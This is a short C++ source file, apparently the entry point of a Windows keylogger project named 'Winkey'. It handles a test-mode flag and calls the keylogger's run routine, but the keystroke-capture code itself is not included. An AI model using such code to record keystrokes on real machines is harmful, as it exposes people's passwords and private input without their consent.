#include "Winkey.hpp"

/* 
 * Check if the test mode has been set.
 * The test mode outputs the key log as a single string,
 * making it easier to compare the log with the expected results.
 */

bool isTestModeSet(int argc, char *argv[]) {
    if (argc > 1 && argv[1][0] == '-') {
        if(argv[1][1] == 't') return true;
        else {
            std::cerr << "Error: Unknown argument.\n";
            exit(1);
        }
    }
    return false;
}

int main(int argc, char *argv[]) {
    Winkey *w = new Winkey();

    try {
        // Run the keylogger
        w->run(isTestModeSet(argc, argv));
    }
    catch (std::exception &e)
    {
        std::cerr << "Error: " << e.what() << std::endl;
        delete w;
        return 1;
    }

    delete w;
    return 0;
}
